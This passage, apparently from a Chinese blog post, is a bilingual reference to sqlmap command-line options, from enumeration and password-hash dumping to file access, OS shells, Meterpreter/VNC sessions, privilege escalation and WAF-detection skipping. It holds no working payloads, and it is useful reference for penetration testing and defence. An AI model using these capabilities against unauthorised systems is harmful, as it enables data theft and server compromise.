class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Enumeration（枚举）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> enumerate the back-end database management<span class=\"built_in\"> system </span>information, structure <span class=\"keyword\">and</span> data contained <span class=\"keyword\">in</span> the tables. Moreover you can <span class=\"builtin-name\">run</span> your own SQL statements</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-a, --all Retrieve everything</span><br><span class=\"line\"><span class=\"comment\">## 检索一切</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-b, --banner Retrieve DBMS banner</span><br><span class=\"line\"><span class=\"comment\">## 检索数据库管理系统的标识</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--current-user Retrieve DBMS current user</span><br><span class=\"line\"><span class=\"comment\">##  检索数据库管理系统的 标识</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--current-db Retrieve DBMS current database</span><br><span class=\"line\"><span class=\"comment\">## 检索数据库管理系统当前数据库</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-hostname Retrieve DBMS<span class=\"built_in\"> server </span>hostname</span><br><span class=\"line\"><span class=\"comment\">## 检索数据库服务器的主机名</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--is-dba Detect <span class=\"keyword\">if</span> the DBMS current<span class=\"built_in\"> user </span>is DBA</span><br><span class=\"line\"><span class=\"comment\">## 检测DBMS当前用户是否DBA</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--users Enumerate DBMS users</span><br><span class=\"line\"><span class=\"comment\">## 枚举数据库管理系统用户</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--passwords Enumerate DBMS<span class=\"built_in\"> users </span>password hashes</span><br><span class=\"line\"><span class=\"comment\">## 枚举数据库管理系统用户密码哈希</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--privileges Enumerate DBMS<span class=\"built_in\"> users </span>privileges</span><br><span class=\"line\"><span class=\"comment\">## 枚举数据库管理系统用户的权限</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--roles Enumerate DBMS<span class=\"built_in\"> users </span>roles</span><br><span class=\"line\"><span class=\"comment\">## 枚举数据库管理系统用户的角色</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--dbs Enumerate DBMS databases</span><br><span class=\"line\"><span class=\"comment\">## 枚举数据库管理系统数据库</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--tables Enumerate DBMS database tables</span><br><span class=\"line\"><span class=\"comment\">##  枚举的DBMS数据库中的表</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--columns Enumerate DBMS database table columns</span><br><span class=\"line\"><span class=\"comment\">## 枚举DBMS数据库表列</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--schema Enumerate DBMS schema</span><br><span class=\"line\"><span class=\"comment\">## 枚举数据库架构</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--count Retrieve number of entries <span class=\"keyword\">for</span> table(s)</span><br><span class=\"line\"><span class=\"comment\">## 检索表的条目数</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--dump Dump DBMS database table entries</span><br><span class=\"line\"><span class=\"comment\">##  转储数据库管理系统的数据库中的表项</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--dump-all Dump all DBMS databases tables entries</span><br><span class=\"line\"><span class=\"comment\">## 转储数据库管理系统的数据库中的表项</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--search Search column(s), table(s) <span class=\"keyword\">and</span>/<span class=\"keyword\">or</span> database name(s)</span><br><span class=\"line\"><span class=\"comment\">##  搜索列（S），表（S）和/或数据库名称（S）</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--comments Retrieve DBMS comments</span><br><span class=\"line\"><span class=\"comment\">##  检索数据库的comments(注释、评论)</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-D DB DBMS database <span class=\"keyword\">to</span> enumerate</span><br><span class=\"line\"><span class=\"comment\">## 要进行枚举的数据库名</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-T TBL DBMS database table(s) <span class=\"keyword\">to</span> enumerate</span><br><span class=\"line\"><span class=\"comment\">##  要进行枚举的数据库表</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-C COL DBMS database table column(s) <span class=\"keyword\">to</span> enumerate</span><br><span class=\"line\"><span class=\"comment\">## 要进行枚举的数据库列</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-X EXCLUDECOL DBMS database table column(s) <span class=\"keyword\">to</span> <span class=\"keyword\">not</span> enumerate</span><br><span class=\"line\"><span class=\"comment\">## 要不进行枚举的数据库列</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-U<span class=\"built_in\"> USER </span>DBMS<span class=\"built_in\"> user </span><span class=\"keyword\">to</span> enumerate</span><br><span class=\"line\"><span class=\"comment\">## 用来进行枚举的数据库用户</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--exclude-sysdbs Exclude DBMS<span class=\"built_in\"> system </span>databases when enumerating tables</span><br><span class=\"line\"><span class=\"comment\">##  枚举表时排除系统数据库</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--pivot-column</span>=P.. Pivot column name</span><br><span class=\"line\"><span class=\"comment\">## 主列名称</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--where</span>=DUMPWHERE Use WHERE condition <span class=\"keyword\">while</span> table dumping</span><br><span class=\"line\"><span class=\"comment\">## 使用WHERE条件进行表转储</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--start</span>=LIMITSTART First query output entry <span class=\"keyword\">to</span> retrieve</span><br><span class=\"line\"><span class=\"comment\">##  第一个查询输出进入检索</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--stop</span>=LIMITSTOP Last query output entry <span class=\"keyword\">to</span> retrieve</span><br><span class=\"line\"><span class=\"comment\">## 最后查询的输出进入检索</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--first</span>=FIRSTCHAR First query output word character <span class=\"keyword\">to</span> retrieve</span><br><span class=\"line\"><span class=\"comment\">## 第一个查询输出字的字符检索</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--last</span>=LASTCHAR Last query output word character <span class=\"keyword\">to</span> retrieve</span><br><span class=\"line\"><span class=\"comment\">## 最后查询的输出字字符检索</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--sql-query</span>=QUERY SQL statement <span class=\"keyword\">to</span> be executed</span><br><span class=\"line\"><span class=\"comment\">## 要执行的SQL语句</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--sql-shell Prompt <span class=\"keyword\">for</span> an interactive SQL shell</span><br><span class=\"line\"><span class=\"comment\">## 提示交互式SQL的shell</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--sql-file</span>=SQLFILE Execute SQL statements <span class=\"keyword\">from</span> given file(s)</span><br><span class=\"line\"><span class=\"comment\">## 从给定文件执行SQL语句</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Brute-Force（蛮力）\"><a href=\"#Brute-Force（蛮力）\" class=\"headerlink\" title=\"Brute Force（蛮力）\"></a>Brute Force（蛮力）</h3><figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Brute force（蛮力）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used to run brute force checks</span><br><span class=\"line\">## 这些选项可以被用来运行蛮力检查。</span><br><span class=\"line\">​</span><br><span class=\"line\">--common-tables Check existence <span class=\"keyword\">of</span> common tables</span><br><span class=\"line\">## 检查存在共同表</span><br><span class=\"line\">​</span><br><span class=\"line\">--common-columns Check existence <span class=\"keyword\">of</span> common columns</span><br><span class=\"line\">## 检查存在共同列</span><br></pre></td></tr></table></figure>\n<h3 id=\"User-defined-function-injection（用户自定义函数注入）\"><a href=\"#User-defined-function-injection（用户自定义函数注入）\" class=\"headerlink\" title=\"User-defined function injection（用户自定义函数注入）\"></a>User-defined function injection（用户自定义函数注入）</h3><figure class=\"highlight vbnet\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-defined <span class=\"keyword\">function</span> injection（用户自定义函数注入）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> create <span class=\"keyword\">custom</span> user-defined functions</span><br><span class=\"line\"><span class=\"meta\">## 这些选项可以用来创建用户自定义函数。</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--udf-inject Inject <span class=\"keyword\">custom</span> user-defined functions</span><br><span class=\"line\"><span class=\"meta\">## 注入用户自定义函数</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--<span class=\"keyword\">shared</span>-<span class=\"keyword\">lib</span>=SHLIB Local path <span class=\"keyword\">of</span> the <span class=\"keyword\">shared</span> library</span><br><span class=\"line\"><span class=\"meta\">## 共享库的本地路径</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"File-system-access（访问文件系统）\"><a href=\"#File-system-access（访问文件系统）\" class=\"headerlink\" title=\"File system access（访问文件系统）\"></a>File system access（访问文件系统）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">File<span class=\"built_in\"> system </span>access（访问文件系统）:</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> access the back-end database management<span class=\"built_in\"> system </span>underlying file system</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可以被用来访问后端数据库管理系统的底层文件系统。</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--file-read</span>=RFILE Read a file <span class=\"keyword\">from</span> the back-end DBMS file system</span><br><span class=\"line\"><span class=\"comment\">## 从后端的数据库管理系统文件系统读取文件</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--file-write</span>=WFILE Write a local file on the back-end DBMS file system</span><br><span class=\"line\"><span class=\"comment\">## 编辑后端的数据库管理系统文件系统上的本地文件</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--file-dest</span>=DFILE Back-end DBMS absolute filepath <span class=\"keyword\">to</span> write <span class=\"keyword\">to</span></span><br><span class=\"line\"><span class=\"comment\">## 后端的数据库管理系统写入文件的绝对路径</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Operating-system-access（操作系统访问）\"><a href=\"#Operating-system-access（操作系统访问）\" class=\"headerlink\" title=\"Operating system access（操作系统访问）\"></a>Operating system access（操作系统访问）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Operating<span class=\"built_in\"> system </span>access（操作系统访问）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> access the back-end database management<span class=\"built_in\"> system </span>underlying operating system</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可以用于访问后端数据库管理系统的底层操作系统。</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--os-cmd</span>=OSCMD Execute an operating<span class=\"built_in\"> system </span>command</span><br><span class=\"line\"><span class=\"comment\">## 执行操作系统命令</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--os-shell Prompt <span class=\"keyword\">for</span> an interactive operating<span class=\"built_in\"> system </span>shell</span><br><span class=\"line\"><span class=\"comment\">##  交互式的操作系统的shell</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--os-pwn Prompt <span class=\"keyword\">for</span> an OOB shell, Meterpreter <span class=\"keyword\">or</span> VNC</span><br><span class=\"line\"><span class=\"comment\">## 获取一个OOB shell，meterpreter或VNC</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--os-smbrelay One click prompt <span class=\"keyword\">for</span> an OOB shell, Meterpreter <span class=\"keyword\">or</span> VNC</span><br><span class=\"line\"><span class=\"comment\">## 一键获取一个OOB shell，meterpreter或VNC</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--os-bof Stored procedure buffer overflow exploitation</span><br><span class=\"line\"><span class=\"comment\">## 存储过程缓冲区溢出利用</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--priv-esc Database process<span class=\"built_in\"> user </span>privilege escalation</span><br><span class=\"line\"><span class=\"comment\">## 数据库进程用户权限提升</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--msf-path</span>=MSFPATH Local path where Metasploit Framework is installed Metasploit Framework</span><br><span class=\"line\"><span class=\"comment\">## 本地的安装路径</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--tmp-path</span>=TMPPATH Remote absolute path of temporary files directory</span><br><span class=\"line\"><span class=\"comment\">## 远程临时文件目录的绝对路径</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Windows-registry-access（Windows注册表访问）\"><a href=\"#Windows-registry-access（Windows注册表访问）\" class=\"headerlink\" title=\"Windows registry access（Windows注册表访问）\"></a>Windows registry access（Windows注册表访问）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windows registry access（Windows注册表访问）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> access the back-end database management<span class=\"built_in\"> system </span>Windows registry</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可以被用来访问后端数据库管理系统Windows注册表。</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--reg-read Read a Windows registry key value</span><br><span class=\"line\"><span class=\"comment\">## 读一个Windows注册表项值</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--reg-<span class=\"builtin-name\">add</span> Write a Windows registry key value data</span><br><span class=\"line\"><span class=\"comment\">## 写一个Windows注册表项值数据</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--reg-del Delete a Windows registry key value</span><br><span class=\"line\"><span class=\"comment\">## 删除Windows注册表键值</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--reg-key</span>=REGKEY Windows registry key</span><br><span class=\"line\"><span class=\"comment\">## Windows注册表键</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--reg-value</span>=REGVAL Windows registry key value</span><br><span class=\"line\"><span class=\"comment\">##  Windows注册表项值</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--reg-data</span>=REGDATA Windows registry key value data</span><br><span class=\"line\"><span class=\"comment\">## Windows注册表键值数据</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--reg-type</span>=REGTYPE Windows registry key value type</span><br><span class=\"line\"><span class=\"comment\">## Windows注册表项值类型</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"General（一般）\"><a href=\"#General（一般）\" class=\"headerlink\" title=\"General（一般）\"></a>General（一般）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">General（一般）:</span><br><span class=\"line\">​</span><br><span class=\"line\">These options can be used <span class=\"keyword\">to</span> <span class=\"builtin-name\">set</span> some general working parameters</span><br><span class=\"line\"><span class=\"comment\">## 这些选项可以用来设置一些一般的工作参数。</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-s SESSIONFILE Load session <span class=\"keyword\">from</span> a stored (.sqlite) file</span><br><span class=\"line\"><span class=\"comment\">## 保存和恢复检索会话文件的所有数据</span></span><br><span class=\"line\">​</span><br><span class=\"line\">-t TRAFFICFILE Log all HTTP traffic into a textual file</span><br><span class=\"line\"><span class=\"comment\">## 记录所有HTTP流量到一个文本文件中</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--batch Never ask <span class=\"keyword\">for</span><span class=\"built_in\"> user </span>input, use the<span class=\"built_in\"> default </span>behaviour</span><br><span class=\"line\"><span class=\"comment\">## 从不询问用户输入，使用所有默认配置。</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--binary-fields</span>=.. Result fields having binary values (e.g. <span class=\"string\">\"digest\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 具有二进制值的结果字段</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--charset</span>=CHARSET Force character encoding used <span class=\"keyword\">for</span> data retrieval</span><br><span class=\"line\"><span class=\"comment\">## 强制用于数据检索的字符编码</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--crawl</span>=CRAWLDEPTH Crawl the website starting <span class=\"keyword\">from</span> the target URL</span><br><span class=\"line\"><span class=\"comment\">## 从目标网址开始抓取网站</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--crawl-exclude</span>=.. Regexp <span class=\"keyword\">to</span> exclude pages <span class=\"keyword\">from</span> crawling (e.g. <span class=\"string\">\"logout\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 正则表达式排除网页抓取</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--csv-del</span>=CSVDEL Delimiting character used <span class=\"keyword\">in</span> CSV output (default <span class=\"string\">\",\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 分隔CSV输出中使用的字符</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--dump-format</span>=DU.. Format of dumped data (CSV (default), HTML <span class=\"keyword\">or</span> SQLITE)</span><br><span class=\"line\"><span class=\"comment\">## 转储数据的格式</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--eta Display <span class=\"keyword\">for</span> each output the estimated time of arrival</span><br><span class=\"line\"><span class=\"comment\">## 显示每个输出的预计到达时间</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--flush-session Flush session files <span class=\"keyword\">for</span> current target</span><br><span class=\"line\"><span class=\"comment\">## 刷新当前目标的会话文件</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--forms Parse <span class=\"keyword\">and</span> test forms on target URL</span><br><span class=\"line\"><span class=\"comment\">## 在目标网址上解析和测试表单</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--fresh-queries Ignore query results stored <span class=\"keyword\">in</span> session file</span><br><span class=\"line\"><span class=\"comment\">## 忽略在会话文件中存储的查询结果</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--hex Use DBMS hex function(s) <span class=\"keyword\">for</span> data retrieval</span><br><span class=\"line\"><span class=\"comment\">## 使用DBMS hex函数进行数据检索</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--output-dir</span>=OUT.. Custom output directory path</span><br><span class=\"line\"><span class=\"comment\">## 自定义输出目录路径</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--parse-errors Parse <span class=\"keyword\">and</span> display DBMS <span class=\"builtin-name\">error</span> messages <span class=\"keyword\">from</span> responses</span><br><span class=\"line\"><span class=\"comment\">## 解析和显示响应中的DBMS错误消息</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--save</span>=SAVECONFIG Save options <span class=\"keyword\">to</span> a configuration INI file</span><br><span class=\"line\"><span class=\"comment\">## 保存选项到INI配置文件</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--scope</span>=SCOPE Regexp <span class=\"keyword\">to</span><span class=\"built_in\"> filter </span>targets <span class=\"keyword\">from</span> provided<span class=\"built_in\"> proxy </span>log</span><br><span class=\"line\"><span class=\"comment\">## 使用正则表达式从提供的代理日志中过滤目标</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--test-filter</span>=TE.. Select tests by payloads <span class=\"keyword\">and</span>/<span class=\"keyword\">or</span> titles (e.g. ROW)</span><br><span class=\"line\"><span class=\"comment\">## 根据有效负载和/或标题(e.g. ROW)选择测试</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--test-skip</span>=TEST.. Skip tests by payloads <span class=\"keyword\">and</span>/<span class=\"keyword\">or</span> titles (e.g. BENCHMARK)</span><br><span class=\"line\"><span class=\"comment\">## 根据有效负载和/或标题跳过测试（e.g. BENCHMARK）</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--update Update sqlmap</span><br><span class=\"line\"><span class=\"comment\">## 更新SqlMap</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"Miscellaneous（杂项）\"><a href=\"#Miscellaneous（杂项）\" class=\"headerlink\" title=\"Miscellaneous（杂项）\"></a>Miscellaneous（杂项）</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Miscellaneous（杂项）:</span><br><span class=\"line\">​</span><br><span class=\"line\">-z MNEMONICS Use short mnemonics (e.g. <span class=\"string\">\"flu,bat,ban,tec=EU\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 使用简短的助记符</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--alert</span>=ALERT <span class=\"builtin-name\">Run</span> host OS command(s) when SQL injection is found</span><br><span class=\"line\"><span class=\"comment\">## 在找到SQL注入时运行主机操作系统命令</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--answers</span>=ANSWERS <span class=\"builtin-name\">Set</span> question answers (e.g. <span class=\"string\">\"quit=N,follow=N\"</span>)</span><br><span class=\"line\"><span class=\"comment\">## 设置问题答案</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--beep Beep on question <span class=\"keyword\">and</span>/<span class=\"keyword\">or</span> when SQL injection is found</span><br><span class=\"line\"><span class=\"comment\">## 发现SQL 注入时提醒</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--cleanup Clean up the DBMS <span class=\"keyword\">from</span> sqlmap specific UDF <span class=\"keyword\">and</span> tables SqlMap</span><br><span class=\"line\"><span class=\"comment\">## 具体的UDF和表清理DBMS</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--dependencies Check <span class=\"keyword\">for</span> missing (non-core) sqlmap dependencies</span><br><span class=\"line\"><span class=\"comment\">## 检查是否缺少（非内核）sqlmap依赖关系</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--disable-coloring <span class=\"builtin-name\">Disable</span><span class=\"built_in\"> console </span>output coloring</span><br><span class=\"line\"><span class=\"comment\">## 禁用控制台输出颜色</span></span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"attribute\">--gpage</span>=GOOGLEPAGE Use Google dork results <span class=\"keyword\">from</span> specified<span class=\"built_in\"> page </span>number</span><br><span class=\"line\"><span class=\"comment\">## 使用Google dork结果指定页码</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--identify-waf Make a thorough testing <span class=\"keyword\">for</span> a WAF/IPS/IDS protection</span><br><span class=\"line\"><span class=\"comment\">## 对WAF / IPS / IDS保护进行全面测试</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--skip-waf Skip heuristic detection of WAF/IPS/IDS protection</span><br><span class=\"line\"><span class=\"comment\">## 跳过启发式检测WAF / IPS / IDS保护</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--mobile Imitate smartphone through HTTP User-Agent header</span><br><span class=\"line\"><span class=\"comment\">##  通过HTTP User-Agent标头模仿智能手机</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--offline Work <span class=\"keyword\">in</span> offline mode (only use session data)</span><br><span class=\"line\"><span class=\"comment\">## 在离线模式下工作（仅使用会话数据）</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--page-rank Display<span class=\"built_in\"> page </span>rank (PR) <span class=\"keyword\">for</span> Google dork results</span><br><span class=\"line\"><span class=\"comment\">##  Google dork结果显示网页排名（PR）</span></span><br><span class=\"line\">​</span><br><span class=\"line\">--purge-output Safely <span 